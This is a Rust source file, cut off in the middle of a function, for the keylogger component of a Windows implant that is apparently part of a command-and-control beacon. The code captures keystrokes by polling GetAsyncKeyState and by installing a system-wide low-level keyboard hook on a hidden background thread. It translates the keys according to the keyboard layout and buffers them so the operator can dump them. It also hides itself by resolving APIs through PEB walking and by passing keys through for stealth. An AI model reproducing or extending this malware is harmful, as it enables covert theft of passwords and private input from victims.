//! Polling keylogger for the Windows PIC implant.
//!
//! ## Honest design note (read this first)
//!
//! A real keylogger installs a hook (`SetWindowsHookExW WH_KEYBOARD_LL`) or an
//! IOCP/raw-input sink that runs on a *background* thread for as long as the
//! implant lives. The current implementation is a **pragmatic polling logger**:
//! when active ([`KEYLOG_ACTIVE`]), [`poll_once`] is called by the beacon loop
//! *once per cycle* and samples the keyboard via `GetAsyncKeyState` for all 256
//! virtual keys. The default sleep is ~5s, so we get roughly one sample per
//! sleep interval — coarse, but it captures any key held down at the sample
//! instant and any key whose *keydown transition* (was-up → now-down) landed in
//! the window since the previous sample. That is honest, functional, and
//! allocation-free in the hot path (only [`do_keylog`] dump allocates).
//!
//! ## Layout support
//!
//! Glyph translation is **layout-aware** via `ToUnicodeEx`: each keydown
//! transition resolves the active thread's `HKL` (`GetKeyboardLayout`), snaps
//! the full 256-byte keyboard state (`GetKeyboardState`), and translates the
//! virtual-key + scan code (`MapVirtualKeyExW`) to the layout-correct glyph.
//! This handles arbitrary keyboard layouts (German QWERTZ, French AZERTY,
//! Dvorak, etc.) for shifted digits and OEM punctuation. Only the ASCII range
//! (< 0x80) is recorded into the 1-byte ring buffer; non-ASCII glyphs are
//! skipped. If any layout API is unavailable, the legacy US table is used as a
//! fallback so capture degrades gracefully (US-correct, non-US-degraded).
//!
//! The polling architecture remains the design boundary: a true hook-based
//! logger requires a persistent background thread, which conflicts with the
//! single-threaded synchronous beacon loop. See P2 in the gap-closure plan for
//! the hook refactor (the constraint is documented in `sleep.rs:249-257`:
//! background threads must bypass the shared syscall trampoline).
//!
//! ## Buffer model
//!
//! `BUF` is a fixed 4096-byte array; `BUF_LEN` (AtomicUsize) is both the write
//! head and the live length. [`poll_once`] appends newly-pressed printable keys
//! without allocating. When the buffer is full, new keys are dropped (oldest
//! data preserved) — documented rather than silently wrapped. [`do_keylog`]
//! action=2 atomically claims `[0..len]` via `BUF_LEN.swap(0, AcqRel)`, copies
//! it into a `Vec`, returns it as `Response::Output`.
//!
//! ## Threading & concurrency (CRITICAL-12)
//!
//! There are two potential writers of `BUF`: the beacon loop's polling path
//! ([`buf_push`]) and the optional `WH_KEYBOARD_LL` hook thread
//! ([`buf_push_release`]). The hook thread is the authoritative writer once it
//! is live — the polling path gates every byte write on
//! [`hook_is_active`] (Acquire) and the `HOOK_THREAD_LIVE` flag is published by
//! the hook thread *itself* (Release, right after `SetWindowsHookExW` and
//! before the message pump), so the polling path can never observe the flag
//! false after the hook thread is able to write.
//!
//! To eliminate the narrow TOCTOU window (polling path reads the flag false,
//! then the hook thread sets it and writes), BOTH writers reserve their byte
//! index via a lock-free `compare_exchange` on `BUF_LEN`. This gives
//! single-writer-per-byte semantics: each index is uniquely owned by exactly
//! one thread, so no two writes ever target the same byte. The protocol is
//! no_std-safe (pure atomics), cannot deadlock if a writer faults mid-write
//! (the next writer's CAS simply fails and retries/drops), and preserves the
//! drop-newest-when-full contract. Ordering is Acquire/Release throughout.
//!
//! `static mut LAST` / `BUF` are touched only inside `unsafe` blocks via raw
//! pointers (`addr_of_mut!`) to avoid the `static_mut_refs` lint under edition
//! 2021.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use alloc::boxed::Box;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use nyx_protocol::Response;

// ---- Win32 constants -------------------------------------------------------

/// `GetAsyncKeyState` return: bit 0x8000 set iff the key is currently down at
/// the instant of the call. Compared via the sign bit (the value is i16, so
/// 0x8000 is the sign bit — negative means down).
const KEY_DOWN_BIT: i16 = -0x8000; // 0x8000 sign-extended into an i16.

/// Virtual-key codes we care about (not a full table — only what we map).
const VK_SHIFT: i32 = 0x10; // either Shift; used for case/symbol selection.
const VK_CAPITAL: i32 = 0x14; // CapsLock; its *toggle* state is bit 0x0001.

/// `MapVirtualKeyExW` translation type: virtual-key → scan code.
const MAPVK_VK_TO_VSC: u32 = 0;

/// `ToUnicodeEx` flags. Bit 0x04 = "don't change keyboard state" — we pass the
/// freshly-snapshotted state in and out without side effects on the real one.
const TO_UNICODE_FLAGS: u32 = 0x04;

// ---- Process-wide state ----------------------------------------------------

/// `true` while the keylogger should sample. action=0 sets it, action=1 clears.
static KEYLOG_ACTIVE: AtomicBool = AtomicBool::new(false);

/// Cached `GetAsyncKeyState` export address (0 = unresolved). Resolved lazily on
/// the first active [`poll_once`]; reused thereafter so we don't re-walk
/// user32's export table every cycle.
static GAKS_ADDR: AtomicUsize = AtomicUsize::new(0);

/// `LAST[vk] == 1` means the key was down at the previous sample. Used to detect
/// the keydown *transition* (was up → now down) so a key held across several
/// cycles is recorded once, not on every sample.
// SAFETY: only touched from the beacon loop (single thread) inside unsafe blocks.
static mut LAST: [u8; 256] = [0; 256];

/// Captured-keystroke ring/linear buffer. 4096 bytes (~ a few pages of typing).
// SAFETY: only touched from the beacon loop (single thread) inside unsafe blocks.
static mut BUF: [u8; BUF_CAP] = [0; BUF_CAP];

/// Capacity of [`BUF`] in bytes. A named const (not `BUF.len()`) so we never
/// form a shared reference to the `static mut` just to read its length.
const BUF_CAP: usize = 4096;

/// Live byte count in `BUF` (also the next write index). Atomic only for static
/// hygiene; the single beacon thread is the sole reader/writer.
static BUF_LEN: AtomicUsize = AtomicUsize::new(0);

// ---- helpers ---------------------------------------------------------------

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors recon.rs /
/// transport.rs). Idempotent: Windows refcounts module loads, so calling it on
/// every activation is cheap and safe.
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    // NUL-terminated ASCII name on the stack (dll names here are short).
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    // SAFETY: `name` is a valid NUL-terminated C string on the stack.
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

/// Resolve & cache `GetAsyncKeyState`. Returns the function pointer, or `None`
/// if user32 could not be loaded or the export was not found. The cached
/// address means the export-table walk happens at most once per process.
fn get_async_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
    // Fast path: already resolved this process.
    let cached = GAKS_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        // SAFETY: we stored a transmuted function pointer; transmute back.
        return Some(unsafe { core::mem::transmute::<usize, _>(cached) });
    }
    // Slow path: force-load user32 (not loaded by default in a PIC implant)
    // and resolve the export via the PEB walk.
    if !force_load(b"user32.dll") {
        return None;
    }
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"GetAsyncKeyState") }?;
    GAKS_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute::<usize, _>(addr) })
}
/// Cached `GetKeyState` export address (0 = unresolved). Resolved alongside
/// `GAKS_ADDR`; used exclusively for the CapsLock toggle query (bit 0 = on).
static GKS_ADDR: AtomicUsize = AtomicUsize::new(0);

// ---- Layout-aware mapping (cached exports) ---------------------------------
//
// The legacy `map_vkey` hardcodes the US layout for shifted digits and OEM
// punctuation. To support arbitrary keyboard layouts we resolve four more
// user32 exports and use `ToUnicodeEx` to translate (vk + shift state) → glyph
// under the active thread's `HKL`. Resolution is cached in `*_ADDR` statics
// (zero = unresolved); on any resolution failure we fall back to the legacy
// US table so the implant keeps capturing (US-correct, non-US-degraded) rather
// than dropping keystrokes entirely.

/// Cached `GetKeyboardLayout` (returns the calling thread's HKL).
static HKL_ADDR: AtomicUsize = AtomicUsize::new(0);
/// Cached `GetKeyboardState` (fills a 256-byte key-state array).
static GKS_STATE_ADDR: AtomicUsize = AtomicUsize::new(0);
/// Cached `MapVirtualKeyExW` (vk → scan code under a layout).
static MVKE_ADDR: AtomicUsize = AtomicUsize::new(0);
/// Cached `ToUnicodeEx` (vk + scan + state → UTF-16 glyph under a layout).
static TUE_ADDR: AtomicUsize = AtomicUsize::new(0);

/// `HKL` is an opaque pointer typedef on Windows (`*mut c_void`).
pub type Hkl = *mut core::ffi::c_void;

type GetKeyboardLayoutFn = unsafe extern "system" fn(u32) -> Hkl;
type GetKeyboardStateFn = unsafe extern "system" fn(*mut u8) -> i32;
type MapVirtualKeyExWFn = unsafe extern "system" fn(u32, u32, Hkl) -> u32;
type ToUnicodeExFn = unsafe extern "system" fn(
    u32,       // wVirtKey
    u32,       // wScanCode
    *const u8, // lpKeyState[256]
    *mut u16,  // lpChar[N]
    i32,       // cchBuffer
    u32,       // wFlags
    Hkl,       // dwhkl
) -> i32;

/// Resolve & cache `GetKeyboardLayout`. Returns the function pointer, or `None`
/// if user32 is unavailable. The `thread_id` arg is the Win32 thread ID (0 =
/// calling thread); we pass 0 from the beacon loop.
fn get_keyboard_layout_fn() -> Option<GetKeyboardLayoutFn> {
    let cached = HKL_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        return Some(unsafe { core::mem::transmute(cached) });
    }
    // user32 is already loaded by get_async_key_state_fn(); just resolve.
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"GetKeyboardLayout") }?;
    HKL_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute(addr) })
}

/// Resolve & cache `GetKeyboardState`.
fn get_keyboard_state_fn() -> Option<GetKeyboardStateFn> {
    let cached = GKS_STATE_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        return Some(unsafe { core::mem::transmute(cached) });
    }
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"GetKeyboardState") }?;
    GKS_STATE_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute(addr) })
}

/// Resolve & cache `MapVirtualKeyExW`.
fn map_virtual_key_ex_fn() -> Option<MapVirtualKeyExWFn> {
    let cached = MVKE_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        return Some(unsafe { core::mem::transmute(cached) });
    }
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"MapVirtualKeyExW") }?;
    MVKE_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute(addr) })
}

/// Resolve & cache `ToUnicodeEx`.
fn to_unicode_ex_fn() -> Option<ToUnicodeExFn> {
    let cached = TUE_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        return Some(unsafe { core::mem::transmute(cached) });
    }
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"ToUnicodeEx") }?;
    TUE_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute(addr) })
}

/// Resolve & cache `GetKeyState`. Returns the function pointer, or `None`
/// if user32 is not loaded. The toggle state returned by `GetKeyState(VK_CAPITAL)`
/// reflects the system toggle, unlike `GetAsyncKeyState` whose bit-0 tracks
/// "pressed since last call" rather than "currently toggled on".
fn get_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
    let cached = GKS_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        return Some(unsafe { core::mem::transmute::<usize, _>(cached) });
    }
    // user32 must already be loaded by get_async_key_state_fn() above;
    // just walk the export table.
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"GetKeyState") }?;
    GKS_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute::<usize, _>(addr) })
}

// ============================================================================
// §P2 — Hook-based capture (persistent background thread)
// ============================================================================
//
// A `WH_KEYBOARD_LL` hook runs on a *background* thread that owns a Windows
// message pump (`GetMessage` loop). This is the "real keylogger" design that
// the polling logger above was a stopgap for. The thread runs entirely on raw
// user32/kernel32 exports — it MUST NOT touch the shared indirect-syscall
// trampoline (`syscalls::global()`), per the single-trampoline rule documented
// in `sleep.rs:249-257`. (Two threads racing the RWX trampoline page corrupt
// it.)
//
// Lifecycle: `do_keylog(0)` spawns the thread + installs the hook; the thread
// writes captured keys into the shared `BUF` (same ring the polling path uses,
// with Acquire/Release ordering now that there's a real concurrent writer).
// `do_keylog(1)` posts `WM_QUIT` to the thread's message pump, joins it, and
// unhooks. `do_keylog(2)` (dump) is unchanged.
//
// Foliage interaction: while the hook thread is live, `sleep.rs`'s Foliage
// mask path checks [`hook_is_active`] and degrades to the data-only floor —
// encrypting `.text` while the hook callback (which lives in `.text`) is in
// flight would corrupt it. See `sleep.rs::execute_foliage_plan` for the gate.

/// `WH_KEYBOARD_LL` hook id (low-level keyboard, system-wide, no DLL needed).
const WH_KEYBOARD_LL: i32 = 13;
/// `WM_KEYDOWN` / `WM_SYSKEYDOWN` — the messages we capture.
const WM_KEYDOWN: u32 = 0x0100;
const WM_SYSKEYDOWN: u32 = 0x0104;
/// `WM_QUIT` — posted to break the hook thread's `GetMessage` loop.
const WM_QUIT: u32 = 0x0012;
/// `HC_ACTION` — the only nCode the hook callback acts on.
const HC_ACTION: i32 = 0;

/// `KBDLLHOOKSTRUCT` (Win32) — what `wParam`/`lParam` deliver for LL keyboard.
#[repr(C)]
#[derive(Clone, Copy)]
struct KbdllHookStruct {
    vk_code: u32,
    scan_code: u32,
    flags: u32,
    time: u32,
    dw_extra_info: usize,
}

/// Bundle of raw user32/kernel32 fn pointers resolved ONCE on the beacon
/// thread, then copied into the hook thread's param block. Mirrors the
/// `FoliageRaw` pattern (`sleep.rs:514-639`). All pointers bypass the shared
/// indirect-syscall trampoline.
#[repr(C)]
#[derive(Clone, Copy)]
struct HookRaw {
    set_windows_hook_ex_w: usize,
    unhook_windows_hook_ex: usize,
    call_next_hook_ex: usize,
    get_message_w: usize,
    post_thread_message_w: usize,
    get_current_thread_id: usize,
    /// Cached layout fns (resolved alongside; reused from the polling path's
    /// singletons — copied in so the hook thread has everything it needs).
    get_keyboard_layout: usize,
    get_keyboard_state: usize,
    map_virtual_key_ex_w: usize,
    to_unicode_ex: usize,
}

/// `SetWindowsHookExW` signature.
type SetWindowsHookExWFn = unsafe extern "system" fn(
    i32,                    // idHook
    *const (),              // lpfn (the hook callback)
    *mut core::ffi::c_void, // hmod (the DLL containing lpfn; null for LL hooks)
    u32,                    // dwThreadId (0 = all existing threads)
) -> *mut core::ffi::c_void; // HHOOK
/// `UnhookWindowsHookEx`.
type UnhookWindowsHookExFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
/// `CallNextHookEx`.
type CallNextHookExFn = unsafe extern "system" fn(
    *mut core::ffi::c_void, // hhk (ignored for LL hooks)
    i32,                    // nCode
    usize,                  // wParam
    isize,                  // lParam
) -> isize;
/// `GetMessageW` — blocks the calling thread until a window message arrives.
type GetMessageWFn = unsafe extern "system" fn(
    *mut Msg,               // lpMsg
    *mut core::ffi::c_void, // hWnd (null = any window)
    u32,                    // wMsgFilterMin
    u32,                    // wMsgFilterMax
) -> i32;
/// `PostThreadMessageW` — how the beacon thread signals `WM_QUIT`.
type PostThreadMessageWFn = unsafe extern "system" fn(
    u32,   // thread id
    u32,   // Msg
    usize, // wParam
    isize, // lParam
) -> i32;
/// `GetCurrentThreadId`.
type GetCurrentThreadIdFn = unsafe extern "system" fn() -> u32;

/// `MSG` struct (Win32) — what `GetMessageW` fills.
#[repr(C)]
#[derive(Clone, Copy)]
struct Msg {
    hwnd: *mut core::ffi::c_void,
    message: u32,
    w_param: usize,
    l_param: isize,
    time: u32,
    pt: u64, // POINT packed into 8 bytes (we don't read it).
}

/// Param block leaked into the hook thread via `Box::into_raw`. Mirrors
/// `FoliageParams` (`sleep.rs:483-505`). The thread reads `raw` to call any
/// Win32 fn, and the beacon reads `tid`/`exit` to control it.
#[repr(C)]
struct KeylogThreadParams {
    /// Raw fn-pointer bundle.
    raw: HookRaw,
    /// The hook thread stores its own Win32 TID here on entry (so the beacon
    /// can `PostThreadMessageW(tid, WM_QUIT, ...)`).
    tid: core::sync::atomic::AtomicU32,
    /// Set by the beacon thread to request the hook thread exit. Polled in the
    /// message loop; a `WM_QUIT` posted via `post_thread_message_w` is the
    /// reliable trigger.
    exit: core::sync::atomic::AtomicBool,
    /// The HHOOK returned by `SetWindowsHookExW`, stored so the beacon can
    /// unhook on stop if the thread already exited.
    hhook: core::sync::atomic::AtomicUsize,
}

// ---- Hook-thread lifetime state (beacon-thread side) ----

/// Non-zero while the hook thread is live. Polled by [`hook_is_active`] which
/// `sleep.rs` reads to gate the Foliage mask path.
static HOOK_THREAD_LIVE: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(false);
/// Leaked param block pointer (zero when no hook thread is running). Owned by
/// the beacon thread; set on start, cleared on stop.
static mut HOOK_PARAMS: *mut KeylogThreadParams = core::ptr::null_mut();
/// Thread handle from `CreateThread` (zero when none). Stored so the beacon
/// can `WaitForSingleObject`-style join via raw export on stop.
static HOOK_THREAD_HANDLE: core::sync::atomic::AtomicUsize =
    core::sync::atomic::AtomicUsize::new(0);

/// `true` while the hook thread is live and capturing. `sleep.rs` reads this
/// to gate the Foliage `.text`-encryption path (encrypting `.text` while the
/// hook callback is in flight corrupts it).
pub(crate) fn hook_is_active() -> bool {
    HOOK_THREAD_LIVE.load(core::sync::atomic::Ordering::Acquire)
}

/// Resolve the [`HookRaw`] bundle on the beacon thread. Returns `None` if any
/// export is missing — caller falls back to polling.
fn resolve_hook_raw() -> Option<HookRaw> {
    // user32 must already be loaded (polling path loads it); if not, force it.
    if GAKS_ADDR.load(Ordering::Relaxed) == 0 && !force_load(b"user32.dll") {
        return None;
    }
    let set_windows_hook_ex_w =
        unsafe { crate::resolve::export_addr(b"user32.dll", b"SetWindowsHookExW")? };
    let unhook_windows_hook_ex =
        unsafe { crate::resolve::export_addr(b"user32.dll", b"UnhookWindowsHookEx")? };
    let call_next_hook_ex =
        unsafe { crate::resolve::export_addr(b"user32.dll", b"CallNextHookEx")? };
    let get_message_w = unsafe { crate::resolve::export_addr(b"user32.dll", b"GetMessageW")? };
    let post_thread_message_w =
        unsafe { crate::resolve::export_addr(b"user32.dll", b"PostThreadMessageW")? };
    let get_current_thread_id =
        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentThreadId")? };
    // Reuse the layout fns the polling path already resolves (or resolve now).
    let get_keyboard_layout = get_keyboard_layout_fn()
        .map(|f| f as *const () as usize)
        .unwrap_or(0);
    let get_keyboard_state = get_keyboard_state_fn()
        .map(|f| f as *const () as usize)
        .unwrap_or(0);
    let map_virtual_key_ex_w = map_virtual_key_ex_fn()
        .map(|f| f as *const () as usize)
        .unwrap_or(0);
    let to_unicode_ex = to_unicode_ex_fn()
        .map(|f| f as *const () as usize)
        .unwrap_or(0);
    Some(HookRaw {
        set_windows_hook_ex_w,
        unhook_windows_hook_ex,
        call_next_hook_ex,
        get_message_w,
        post_thread_message_w,
        get_current_thread_id,
        get_keyboard_layout,
        get_keyboard_state,
        map_virtual_key_ex_w,
        to_unicode_ex,
    })
}

/// The hook thread entry. Runs ENTIRELY on raw exports (per the single-
/// trampoline rule). Installs `WH_KEYBOARD_LL`, runs a `GetMessage` pump, and
/// on `WM_KEYDOWN`/`WM_SYSKEYDOWN` translates the vk via `ToUnicodeEx` (or the
/// US fallback) and pushes into the shared `BUF`. Exits on `WM_QUIT`.
///
/// SAFETY: called by `CreateThread`; `param` is a leaked `Box<KeylogThreadParams>`.
unsafe extern "system" fn keylog_hook_thread(param: usize) -> u32 {
    let params: *mut KeylogThreadParams = param as *mut KeylogThreadParams;
    if params.is_null() {
        return 1;
    }
    let raw = (*params).raw;

    // Resolve fn pointers from the bundle. (CallNextHookEx is resolved on the
    // fly inside the hook callback — see call_next_hook_resolved.)
    let set_hook: SetWindowsHookExWFn = core::mem::transmute(raw.set_windows_hook_ex_w);
    let get_message: GetMessageWFn = core::mem::transmute(raw.get_message_w);
    let get_tid: GetCurrentThreadIdFn = core::mem::transmute(raw.get_current_thread_id);

    // Record our TID so the beacon can post WM_QUIT.
    let my_tid = unsafe { get_tid() };
    (*params)
        .tid
        .store(my_tid, core::sync::atomic::Ordering::Release);

    // Install the LL keyboard hook. The callback is `keylog_hook_proc` below;
    // hmod is null for LL hooks (the callback must be in our .text — but we
    // don't load a separate DLL).
    let hhook = unsafe {
        set_hook(
            WH_KEYBOARD_LL,
            keylog_hook_proc as *const (),
            core::ptr::null_mut(),
            0,
        )
    };
    if hhook.is_null() {
        // Hook install failed — exit, leaving HOOK_THREAD_LIVE false.
        return 2;
    }
    (*params)
        .hhook
        .store(hhook as usize, core::sync::atomic::Ordering::Release);

    // CRITICAL-12 fix: the HOOK_THREAD_LIVE flag is the gate that stops the
    // beacon polling path from writing BUF (see `poll_once`). It MUST be
    // published BEFORE this thread can possibly call `buf_push_release` —
    // which happens as soon as the message pump starts dispatching the hook
    // callback. Previously the beacon thread set this flag AFTER CreateThread
    // returned, so a keystroke landing in the gap let the hook callback and the
    // beacon's `buf_push` race the same byte. Now the hook thread publishes it
    // itself, with Release ordering, immediately after SetWindowsHookExW
    // succeeds and before entering the pump — so any subsequent Acquire read by
    // the polling path is guaranteed to see it before the first hook write.
    HOOK_THREAD_LIVE.store(true, core::sync::atomic::Ordering::Release);

    // Message pump. GetMessage blocks until a message arrives (the hook
    // callback runs on THIS thread's stack via the Windows hook dispatch).
    let mut msg = Msg {
        hwnd: core::ptr::null_mut(),
        message: 0,
        w_param: 0,
        l_param: 0,
        time: 0,
        pt: 0,
    };
    loop {
        // GetMessageW returns 0 on WM_QUIT, -1 on error, >0 otherwise.
        let r = unsafe { get_message(&mut msg, core::ptr::null_mut(), 0, 0) };
        if r <= 0 {
            break; // WM_QUIT or error
        }
    }

    // Cleanup: unhook (if the beacon hasn't already).
    let unhook: UnhookWindowsHookExFn = core::mem::transmute(raw.unhook_windows_hook_ex);
    let prev = (*params)
        .hhook
        .swap(0, core::sync::atomic::Ordering::AcqRel);
    if prev != 0 {
        unsafe { unhook(prev as *mut core::ffi::c_void) };
    }
    0
}

/// The `WH_KEYBOARD_LL` callback. Runs on the hook thread (in the message
/// pump's call stack). On `WM_KEYDOWN`/`WM_SYSKEYDOWN`, reads the
/// `KBDLLHOOKSTRUCT` from `lParam`, translates the vk, and pushes into `BUF`.
///
/// CRITICAL: this fn lives in `.text`. The Foliage sleep-mask path checks
/// [`hook_is_active`] and degrades when this thread is live — if it ever runs
/// during a `.text`-encrypt window it would execute ciphertext. The gate in
/// `sleep.rs` is the guard.
unsafe extern "system" fn keylog_hook_proc(n_code: i32, w_param: usize, l_param: isize) -> isize {
    // We only act on HC_ACTION + a keydown message.
    if n_code != HC_ACTION {
        // SAFETY: call_next is a valid fn pointer resolved by the hook thread;
        // but this callback has no direct access to the HookRaw bundle. We
        // re-resolve on the fly (cheap — cached export address).
        return unsafe { call_next_hook_resolved(n_code, w_param, l_param) };
    }
    let msg = w_param as u32;
    if msg != WM_KEYDOWN && msg != WM_SYSKEYDOWN {
        return unsafe { call_next_hook_resolved(n_code, w_param, l_param) };
    }
    // lParam points at a KBDLLHOOKSTRUCT.
    let info: *const KbdllHookStruct = l_param as *const KbdllHookStruct;
    if !info.is_null() {
        let vk = (*info).vk_code as i32;
        // Translate via the layout-aware path (falls back to US table). Reuse
        // the resolved layout fns if available.
        if let Some(b) = translate_vk_for_hook(vk) {
            buf_push_release(b);
        }
    }
    // Always call the next hook (we don't swallow input — stealth).
    unsafe { call_next_hook_resolved(n_code, w_param, l_param) }
}

/// Re-resolve `CallNextHookEx` from inside the hook callback (it can't see the
/// `HookRaw` bundle directly). Cached after first call via a static.
unsafe fn call_next_hook_resolved(n_code: i32, w_param: usize, l_param: isize) -> isize {
    static CNH_ADDR: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
    let cached = CNH_ADDR.load(core::sync::atomic::Ordering::Relaxed);
    let addr = if cached != 0 {
        cached
    } else {
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CallNextHookEx") } {
            Some(a) => {
                CNH_ADDR.store(a, core::sync::atomic::Ordering::Relaxed);
                a
            }
            None => {
                // Without CallNextHookEx we must return 0 (pass-through); the
                // hook chain is broken but we don't crash.
                return 0;
            }
        }
    };
    let f: CallNextHookExFn = unsafe { core::mem::transmute(addr) };
    unsafe { f(core::ptr::null_mut(), n_code, w_param, l_param) }
}

/// Translate a vk code to a byte inside the hook callback. Uses the resolved
/// layout fns if present (copied into `HookRaw`); otherwise the US table.
unsafe fn translate_vk_for_hook(vk: i32) -> Option<u8> {
    // Layout-aware path requires all four fns. If any is missing, fall back.
    if HKL_ADDR.load(Ordering::Relaxed) != 0
        && GKS_STATE_ADDR.load(Ordering::Relaxed) != 0
        && MVKE_ADDR.load(Ordering::Relaxed) != 0
        && TUE_ADDR.load(Ordering::Relaxed) != 0
    {
        // All four resolved — map_vkey_layout_aware works.
        return map_vkey_layout_aware(vk, false);
    }
    // Fallback: US table, plain shift (the hook callback doesn't track shift
    // state per-key; ToUnicodeEx would, but it's unavailable here).
    map_vkey(vk, false)
}

/// Lock-free single-writer-per-byte index reservation for `BUF`.
///
/// CRITICAL-12 core primitive: both [`buf_push`] (polling path) and
/// [`buf_push_release`] (hook thread) call this to atomically claim a unique
/// byte index via `compare_exchange` on `BUF_LEN`. Returns `Some(idx)` with
/// `idx < BUF_CAP` on success (THIS thread exclusively owns `BUF[idx]`), or
/// `None` if the buffer is full or the CAS could not land within a small
/// bounded retry count (drop-newest semantics). Because each index is claimed
/// by exactly one thread, no two writes ever target the same byte — the data
/// race on the old load-store sequence is eliminated. The protocol is
/// no_std-safe (pure atomics), cannot deadlock if a writer faults mid-write
/// (the next writer's CAS simply fails and retries/drops), and pairs with the
/// `swap(0, AcqRel)` drain in `do_keylog(2)`.
fn claim_buf_index() -> Option<usize> {
    let mut len = BUF_LEN.load(Ordering::Acquire);
    for _ in 0..4 {
        if len >= BUF_CAP {
            return None; // full — drop newest (documented behavior).
        }
        match BUF_LEN.compare_exchange(len, len + 1, Ordering::AcqRel, Ordering::Acquire) {
            Ok(_) => return Some(len), // uniquely claimed `len`.
            Err(actual) => len = actual, // another writer moved the head; retry.
        }
    }
    None // could not claim in 4 attempts; drop newest.
}

/// Append one byte to `BUF` from the hook thread (a real concurrent writer).
///
/// CRITICAL-12: this and [`buf_push`] (the polling-path writer) can run
/// concurrently on two threads. The previous load-store sequence was a plain
/// data race: both threads could read the same `len`, both write the same byte,
/// and one byte would be lost (or torn under `panic=abort` + a sanitizer).
///
/// The fix is a lock-free single writer-per-byte protocol built on a
/// compare-and-swap of `BUF_LEN`:
///   1. Atomically reserve an index: `compare_exchange(len, len+1)`. Success
///      means THIS thread uniquely owns `BUF[len]`; no other writer can claim
///      the same index.
///   2. Write the byte at the now-exclusively-owned index.
///
/// Because each byte index is claimed by exactly one thread, the writes never
/// overlap and the byte content is unambiguous. The CAS uses Acquire on the
/// load side (so we synchronize with a prior thread that published the flag or
/// reset the length) and AcqRel on the success store (publishes the reserved
/// index to a later reader). This is no_std-safe (pure atomics, no lock),
/// cannot deadlock if the hook thread faults mid-write (the CAS simply fails
/// for the next writer, which retries or drops), and preserves the
/// drop-newest-when-full semantics.
///
/// `do_keylog(2)` dumps `[0..BUF_LEN]`; it reads `BUF_LEN` with Acquire (via
/// `swap(0, AcqRel)`), which pairs with the AcqRel success store here, so it
/// only sees fully-reserved indices whose bytes have been written.
fn buf_push_release(b: u8) {
    // Reserve an index via the shared CAS helper. Retry a bounded number of
    // times on contention (the only contender is the polling path, which is
    // gated off once the hook thread is live — see buf_push); under normal
    // operation the first CAS succeeds.
    let len = claim_buf_index();
    // SAFETY: `len < BUF_CAP` (claim_buf_index guarantees it) and `len` was
    // uniquely claimed by THIS thread via the successful CAS, so no other
    // writer can touch BUF[len]. The raw pointer via addr_of_mut! avoids
    // forming a `&mut static mut` (static_mut_refs lint).
    if let Some(len) = len {
        unsafe {
            let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
            *ptr.add(len) = b;
        }
    }
}

/// Map a virtual-key code + shift state to a single printable byte, or `None`
/// if the key isn't one we record (function keys, arrows, modifiers, etc.).
///
/// Letters: lowercase unless Shift is held XOR CapsLock is toggled (XOR matches
/// Win32: CapsLock+Shift = lowercase). Digits: Shift selects the shifted symbol
/// (`1`→`!`, `2`→`@`, …) on the US layout. OEM keys cover the common US punctuation.
/// Layouts other than US will record the wrong glyph for shifted digits/OEM keys
/// — documented as a known limitation of polling without `ToUnicodeEx`.
fn map_vkey(vk: i32, shift: bool) -> Option<u8> {
    // Control/whitespace keys.
    match vk {
        0x08 => return Some(0x08),         // Backspace → '\b'
        0x09 => return Some(0x09),         // Tab       → '\t'
        0x0D => return Some(b'\n'),        // Enter     → '\n'
        0x20 => return Some(b' '),         // Space
        0x10 | 0x11 | 0x12 => return None, // Shift/Ctrl/Alt modifiers — not recorded.
        _ => {}
    }
    // Digits '0'..'9' (0x30..0x39); Shift selects the shifted symbol.
    if (0x30..=0x39).contains(&vk) {
        if shift {
            // US layout: )!@#$%^&*(
            const SHIFTED: &[u8; 10] = b")!@#$%^&*(";
            return Some(SHIFTED[(vk - 0x30) as usize]);
        }
        return Some(b'0' + (vk - 0x30) as u8);
    }
    // Letters 'A'..'Z' (0x41..0x5A); vkey is always the uppercase code.
    if (0x41..=0x5A).contains(&vk) {
        let upper = b'A' + (vk - 0x41) as u8;
        return Some(if shift { upper } else { upper + 32 }); // +32 → lowercase ASCII.
    }
    // OEM punctuation (US layout). Shift picks the upper glyph.
    let pair: Option<(u8, u8)> = match vk {
        0xBA => Some((b';', b':')),
        0xBB => Some((b'=', b'+')),
        0xBC => Some((b',', b'<')),
        0xBD => Some((b'-', b'_')),
        0xBE => Some((b'.', b'>')),
        0xBF => Some((b'/', b'?')),
        0xC0 => Some((b'`', b'~')),
